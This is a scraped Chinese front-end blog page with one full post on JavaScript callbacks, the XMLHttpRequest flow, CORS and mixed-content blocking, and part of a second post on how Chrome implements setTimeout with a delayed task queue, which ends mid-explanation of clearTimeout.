<h2 itemprop="name">
  <a class="article-title" href="/2019/12/03/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94XMLHttpRequest/"
    >JS事件循环机制——XMLHttpRequest</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2019/12/03/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94XMLHttpRequest/" class="article-date">
  <time datetime="2019-12-03T02:42:54.000Z" itemprop="datePublished">2019-12-03</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a> / <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/JS/">JS</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="回调函数-VS-系统调用栈"><a href="#回调函数-VS-系统调用栈" class="headerlink" title="回调函数 VS 系统调用栈"></a>回调函数 VS 系统调用栈</h1><p>那什么是回调函数呢（<code>Callback Function</code>）？</p>
<p>将一个函数作为参数传递给另外一个函数，那作为参数的这个函数就是回调函数。简化的代码如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> callback = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;i am do homework&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doWork</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start do work&#x27;</span>)</span><br><span class="line">  <span class="title function_">cb</span>()</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;end do work&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">doWork</span>(callback)</span><br></pre></td></tr></table></figure>
<p>在上面示例代码中，我们将一个匿名函数赋值给变量<code>callback</code>，同时将<code>callback</code>作为参数传递给了<code>doWork()</code>函数，这时在函数<code>doWork()</code>中<code>callback</code>就是回调函数。</p>
<p>上面的回调方法有个特点，就是回调函数<code>callback</code>是在主函数<code>doWork</code>返回之前执行的，我们把这个回调过程称为同步回调。</p>
<p>既然有同步回调，那肯定也有异步回调。下面我们再来看看异步回调的例子：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> callback = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;i am do homework&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doWork</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;start do work&#x27;</span>)</span><br><span class="line">  <span class="built_in">setTimeout</span>(cb,<span class="number">1000</span>)   </span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;end do work&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">doWork</span>(callback)</span><br></pre></td></tr></table></figure>
<p>在这个例子中，我们使用了<code>setTimeout</code>函数让<code>callback</code>在<code>doWork</code>函数执行结束后，又延时了 1 秒再执行，这次<code>callback</code>并没有在主函数<code>doWork</code>内部被调用，我们把这种回调函数在主函数外部执行的过程称为异步回调。</p>
<p>现在你应该知道什么是同步回调和异步回调了，那下面我们再深入点，站在消息循环的视角来看看同步回调和异步回调的区别。理解了这些，可以让你从本质上理解什么是回调。</p>
<p>我们还是先来回顾下页面的事件循环系统，浏览器页面是通过事件循环机制来驱动的，每个渲染进程都有一个消息队列，页面主线程按照顺序来执行消息队列中的事件，如执行 JavaScript 事件、解析 DOM 事件、计算布局事件、用户输入事件等等，如果页面有新的事件产生，那新的事件将会追加到事件队列的尾部。所以可以说是消息队列和主线程循环机制保证了页面有条不紊地运行。</p>
<p>这里还需要补充一点，那就是当循环系统在执行一个任务的时候，都要为这个任务维护一个系统调用栈。这个系统调用栈类似于 JavaScript 的调用栈，只不过系统调用栈是 Chromium 的开发语言 C++ 来维护的，其完整的调用栈信息你可以通过<code>chrome://tracing/</code>来抓取。当然，你也可以通过<code>Performance</code>来抓取它核心的调用信息，如下图所示：</p>
<img src="/2019/12/03/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94XMLHttpRequest/img1.png" class="" title="消息循环系统调用栈记录">

<p>这幅图记录了一个 Parse HTML 的任务执行过程，其中黄色的条目表示执行 JavaScript 的过程，其他颜色的条目表示浏览器内部系统的执行过程。</p>
<p>通过该图你可以看出来，Parse HTML 任务在执行过程中会遇到一系列的子过程，比如在解析页面的过程中遇到了 JavaScript 脚本，那么就暂停解析过程去执行该脚本，等执行完成之后，再恢复解析过程。然后又遇到了样式表，这时候又开始解析样式表……直到整个任务执行完成。</p>
<p>需要说明的是，整个 Parse HTML 是一个完整的任务，在执行过程中的脚本解析、样式表解析都是该任务的子过程，其下拉的长条就是执行过程中调用栈的信息。</p>
<p>每个任务在执行过程中都有自己的调用栈，那么同步回调就是在当前主函数的上下文中执行回调函数，这个没有太多可讲的。下面我们主要来看看异步回调过程，异步回调是指回调函数在主函数之外执行，一般有两种方式：</p>
<ul>
<li>第一种是把异步函数做成一个任务，添加到信息队列尾部；</li>
<li>第二种是把异步函数添加到微任务队列中，这样就可以在当前任务的末尾处执行微任务了。</li>
</ul>
<h1 id="XMLHttpRequest-运作机制"><a href="#XMLHttpRequest-运作机制" class="headerlink" title="XMLHttpRequest 运作机制"></a>XMLHttpRequest 运作机制</h1><p>理解了什么是同步回调和异步回调，接下来我们就来分析<code>XMLHttpRequest</code>背后的实现机制，具体工作过程你可以参考下图：</p>
<img src="/2019/12/03/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94XMLHttpRequest/img2.png" class="" title="XMLHttpRequest 工作流程图">

<p>这是<code>XMLHttpRequest</code>的总执行流程图，下面我们就来分析从发起请求到接收数据的完整流程。</p>
<p>我们先从<code>XMLHttpRequest</code>的用法开始，首先看下面这样一段请求代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">GetWebData</span>(<span class="params">URL</span>)&#123;</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 1: 新建 XMLHttpRequest 请求对象</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 2: 注册相关事件回调处理函数 </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">switch</span>(xhr.<span class="property">readyState</span>)&#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// 请求未初始化</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; 请求未初始化 &quot;</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//OPENED</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;OPENED&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//HEADERS_RECEIVED</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HEADERS_RECEIVED&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//LOADING  </span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LOADING&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:<span class="comment">//DONE</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>||<span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">304</span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">          &#125;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;DONE&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  xhr.<span class="property">ontimeout</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;ontimeout&#x27;</span>) &#125;</span><br><span class="line">  xhr.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">e</span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;onerror&#x27;</span>) &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 3: 打开请求</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  xhr.<span class="title function_">open</span>(<span class="string">&#x27;Get&#x27;</span>, <span class="variable constant_">URL</span>, <span class="literal">true</span>);<span class="comment">// 创建一个 Get 请求, 采用异步</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 4: 配置参数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  xhr.<span class="property">timeout</span> = <span class="number">3000</span> <span class="comment">// 设置 xhr 请求的超时时间</span></span><br><span class="line">  xhr.<span class="property">responseType</span> = <span class="string">&quot;text&quot;</span> <span class="comment">// 设置响应返回的数据格式</span></span><br><span class="line">  xhr.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;X_TEST&quot;</span>,<span class="string">&quot;time.geekbang&quot;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 5: 发送请求</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">  xhr.<span class="title function_">send</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面是一段利用了<code>XMLHttpRequest</code>来请求数据的代码，再结合上面的流程图，我们可以分析下这段代码是怎么执行的。</p>
<p>第一步：创建<code>XMLHttpRequest</code>对象。</p>
<p>当执行到<code>let xhr = new XMLHttpRequest()</code>后，JavaScript 会创建一个<code>XMLHttpRequest</code>对象<code>xhr</code>，用来执行实际的网络请求操作。</p>
<p>第二步：为<code>xhr</code>对象注册回调函数。</p>
<p>因为网络请求比较耗时，所以要注册回调函数，这样后台任务执行完成之后就会通过调用回调函数来告诉其执行结果。</p>
<p><code>XMLHttpRequest</code>的回调函数主要有下面几种：<br><code>ontimeout</code>，用来监控超时请求，如果后台请求超时了，该函数会被调用；<br><code>onerror</code>，用来监控出错信息，如果后台请求出错了，该函数会被调用；<br><code>onreadystatechange</code>，用来监控后台请求过程中的状态，比如可以监控到 HTTP 头加载完成的消息、HTTP 响应体消息以及数据加载完成的消息等。</p>
<p>第三步：配置基础的请求信息。</p>
<p>注册好回调事件之后，接下来就需要配置基础的请求信息了，首先要通过<code>open</code>接口配置一些基础的请求信息，包括请求的地址、请求方法（是 get 还是 post）和请求方式（同步还是异步请求）。</p>
<p>然后通过<code>xhr</code>内部属性类配置一些其他可选的请求信息，你可以参考文中示例代码，我们通过<code>xhr.timeout = 3000</code>来配置超时时间，也就是说如果请求超过 3000 毫秒还没有响应，那么这次请求就被判断为失败了。</p>
<p>我们还可以通过<code>xhr.responseType = &quot;text&quot;</code>来配置服务器返回的格式，将服务器返回的数据自动转换为自己想要的格式，如果将<code>responseType</code>的值设置为<code>json</code>，那么系统会自动将服务器返回的数据转换为 JavaScript 对象格式。下面的图表是我列出的一些返回类型的描述：</p>
<img src="/2019/12/03/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94XMLHttpRequest/img3.png" class="">

<p>假如你还需要添加自己专用的请求头属性，可以通过<code>xhr.setRequestHeader</code>来添加。</p>
<p>第四步：发起请求。</p>
<p>一切准备就绪之后，就可以调用xhr.send来发起网络请求了。你可以对照上面那张请求流程图，可以看到：渲染进程会将请求发送给网络进程，然后网络进程负责资源的下载，等网络进程接收到数据之后，就会利用 IPC 来通知渲染进程；渲染进程接收到消息之后，会将 xhr 的回调函数封装成任务并添加到消息队列中，等主线程循环系统执行到该任务的时候，就会根据相关的状态来调用对应的回调函数。</p>
<p>如果网络请求出错了，就会执行<code>xhr.onerror</code>；<br>如果超时了，就会执行<code>xhr.ontimeout</code>；<br>如果是正常的数据接收，就会执行<code>onreadystatechange</code>来反馈相应的状态。<br>这就是一个完整的<code>XMLHttpRequest</code>请求流程。</p>
<p><code>XMLHttpRequest</code>使用过程中的“坑”<br>上述过程看似简单，但由于浏览器很多安全策略的限制，所以会导致你在使用过程中踩到非常多的“坑”。</p>
<p>浏览器安全问题是前端工程师避不开的一道坎，通常在使用过程中遇到的“坑”，很大一部分都是由安全策略引起的，不管你喜不喜欢，它都在这里。本来很完美的一个方案，正是由于加了安全限制，导致使用起来非常麻烦。</p>
<p>而你要做的就是去正视这各种的安全问题。也就是说要想更加完美地使用<code>XMLHttpRequest</code>，你就要了解浏览器的安全策略。</p>
<p>下面我们就来看看在使用<code>XMLHttpRequest</code>的过程中所遇到的跨域问题和混合内容问题。</p>
<ol>
<li>跨域问题<br>比如在极客邦的官网使用<code>XMLHttpRequest</code>请求极客时间的页面内容，由于极客邦的官网是<code>www.geekbang.org</code>，极客时间的官网是<code>time.geekbang.org</code>，它们不是同一个源，所以就涉及到了跨域（在 A 站点中去访问不同源的 B 站点的内容）。默认情况下，跨域请求是不被允许的，你可以看下面的示例代码：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>()</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;https://time.geekbang.org/&#x27;</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">handler</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">switch</span>(xhr.<span class="property">readyState</span>)&#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// 请求未初始化</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; 请求未初始化 &quot;</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//OPENED</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;OPENED&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//HEADERS_RECEIVED</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;HEADERS_RECEIVED&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//LOADING  </span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LOADING&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:<span class="comment">//DONE</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>||<span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">304</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;DONE&quot;</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">   </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callOtherDomain</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(xhr) &#123;    </span><br><span class="line">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>)</span><br><span class="line">    xhr.<span class="property">onreadystatechange</span> = handler</span><br><span class="line">    xhr.<span class="title function_">send</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">callOtherDomain</span>()</span><br></pre></td></tr></table></figure>
你可以在控制台测试下。首先通过浏览器打开<code>www.geekbang.org</code>，然后打开控制台，在控制台输入以上示例代码，再执行，会看到请求被 Block 了。控制台的提示信息如下：</li>
</ol>
<p><code>Access to XMLHttpRequest at &#39;https://time.geekbang.org/&#39; from origin &#39;https://www.geekbang.org&#39; has been blocked by CORS policy: No &#39;Access-Control-Allow-Origin&#39; header is present on the requested resource.</code><br>因为<code>www.geekbang.org</code>和<code>time.geekbang.com</code>不属于一个域，所以以上访问就属于跨域访问了，这次访问失败就是由于跨域问题导致的。</p>
<ol start="2">
<li>HTTPS 混合内容的问题<br>了解完跨域问题后，我们再来看看 HTTPS 的混合内容。HTTPS 混合内容是 HTTPS 页面中包含了不符合 HTTPS 安全要求的内容，比如包含了 HTTP 资源，通过 HTTP 加载的图像、视频、样式表、脚本等，都属于混合内容。</li>
</ol>
<p>通常，如果 HTTPS 请求页面中使用混合内容，浏览器会针对 HTTPS 混合内容显示警告，用来向用户表明此 HTTPS 页面包含不安全的资源。比如打开站点<code>https://www.iteye.com/groups</code>，可以通过控制台看到混合内容的警告，参考下图：</p>
<img src="/2019/12/03/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94XMLHttpRequest/img4.png" class="" title="HTTPS 混合内容警告">

<p>从上图可以看出，通过 HTML 文件加载的混合资源，虽然给出警告，但大部分类型还是能加载的。而使用<code>XMLHttpRequest</code>请求时，浏览器认为这种请求可能是攻击者发起的，会阻止此类危险的请求。比如我通过浏览器打开地址<code>https://www.iteye.com/groups</code>，然后通过控制台，使用<code>XMLHttpRequest</code>来请求<code>http://img-ads.csdn.net/2018/201811150919211586.jpg</code>，这时候请求就会报错，出错信息如下图所示：</p>
<img src="/2019/12/03/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94XMLHttpRequest/img5.png" class="" title="使用 XMLHttpRequest 混合资源失效">

 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS/" rel="tag">JS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/" rel="tag">JS事件循环机制</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-前端/js/深入/JS事件循环机制——setTimeout"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2019/12/02/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94setTimeout/"
    >JS事件循环机制——setTimeout</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2019/12/02/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94setTimeout/" class="article-date">
  <time datetime="2019-12-02T09:15:13.000Z" itemprop="datePublished">2019-12-02</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a> / <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/JS/">JS</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="浏览器怎么实现-setTimeout"><a href="#浏览器怎么实现-setTimeout" class="headerlink" title="浏览器怎么实现 setTimeout"></a>浏览器怎么实现 setTimeout</h1><p>我们知道渲染进程中所有运行在主线程上的任务都需要先添加到消息队列，然后事件循环系统再按照顺序执行消息队列中的任务。下面我们来看看那些典型的事件：</p>
<ul>
<li>当接收到 HTML 文档数据，渲染引擎就会将“解析 DOM”事件添加到消息队列中，</li>
<li>当用户改变了 Web 页面的窗口大小，渲染引擎就会将“重新布局”的事件添加到消息队列中。</li>
<li>当触发了 JavaScript 引擎垃圾回收机制，渲染引擎会将“垃圾回收”任务添加到消息队列中。</li>
<li>同样，如果要执行一段异步 JavaScript 代码，也是需要将执行任务添加到消息队列中。</li>
</ul>
<p>以上列举的只是一小部分事件，这些事件被添加到消息队列之后，事件循环系统就会按照消息队列中的顺序来执行事件。</p>
<p>所以说要执行一段异步任务，需要先将任务添加到消息队列中。不过通过定时器设置回调函数有点特别，它们需要在指定的时间间隔内被调用，但消息队列中的任务是按照顺序执行的，所以为了保证回调函数能在指定时间内执行，你不能将定时器的回调函数直接添加到消息队列中。</p>
<p>那么该怎么设计才能让定时器设置的回调事件在规定时间内被执行呢？</p>
<p>在 Chrome 中除了正常使用的消息队列之外，还有另外一个消息队列，这个队列中维护了需要延迟执行的任务列表，包括了定时器和 Chromium 内部一些需要延迟执行的任务。所以当通过 JavaScript 创建一个定时器时，渲染进程会将该定时器的回调任务添加到延迟队列中。</p>
<p>源码中延迟执行队列的定义如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DelayedIncomingQueue delayed_incoming_queue;</span><br></pre></td></tr></table></figure>
<p>当通过 JavaScript 调用<code>setTimeout</code>设置回调函数的时候，渲染进程将会创建一个回调任务，包含了回调函数<code>showName</code>、当前发起时间、延迟执行时间，其模拟代码如下所示：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">DelayTask</span> &#123;</span><br><span class="line">  int64 id；</span><br><span class="line">  CallBackFunction cbf;</span><br><span class="line">  <span class="type">int</span> start_time;</span><br><span class="line">  <span class="type">int</span> delay_time;</span><br><span class="line">&#125;;</span><br><span class="line">DelayTask timerTask;</span><br><span class="line">timerTask.cbf = showName;</span><br><span class="line">timerTask.start_time = <span class="built_in">getCurrentTime</span>(); <span class="comment">// 获取当前时间</span></span><br><span class="line">timerTask.delay_time = <span class="number">200</span>;<span class="comment">// 设置延迟执行时间</span></span><br></pre></td></tr></table></figure>
<p>创建好回调任务之后，再将该任务添加到延迟执行队列中，代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delayed_incoming_queue.push(timerTask)；</span><br></pre></td></tr></table></figure>
<p>现在通过定时器发起的任务就被保存到延迟队列中了，那接下来我们再来看看消息循环系统是怎么触发延迟队列的。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">ProcessTimerTask</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 从 delayed_incoming_queue 中取出已经到期的定时器任务</span></span><br><span class="line">  <span class="comment">// 依次执行这些任务</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">TaskQueue task_queue；</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ProcessTask</span><span class="params">()</span></span>;</span><br><span class="line"><span class="type">bool</span> keep_running = <span class="literal">true</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainTherad</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="comment">// 执行消息队列中的任务</span></span><br><span class="line">    Task task = task_queue.<span class="built_in">takeTask</span>();</span><br><span class="line">    <span class="built_in">ProcessTask</span>(task);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 执行延迟队列中的任务</span></span><br><span class="line">    <span class="built_in">ProcessDelayTask</span>()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!keep_running) <span class="comment">// 如果设置了退出标志，那么直接退出线程循环</span></span><br><span class="line">        <span class="keyword">break</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从上面代码可以看出来，我们添加了一个<code>ProcessDelayTask</code>函数，该函数是专门用来处理延迟执行任务的。这里我们要重点关注它的执行时机，在上段代码中，处理完消息队列中的一个任务之后，就开始执行<code>ProcessDelayTask</code>函数。<code>ProcessDelayTask</code>函数会根据发起时间和延迟时间计算出到期的任务，然后依次执行这些到期的任务。等到期的任务执行完成之后，再继续下一个循环过程。通过这样的方式，一个完整的定时器就实现了。</p>
<p>设置一个定时器，JavaScript 引擎会返回一个定时器的 ID。那通常情况下，当一个定时器的任务还没有被执行的时候，也是可以取消的，具体方法是调用<code>clearTimeout</code>函数，并传入需要取消的定时器的 ID。如下面代码所示：</p>
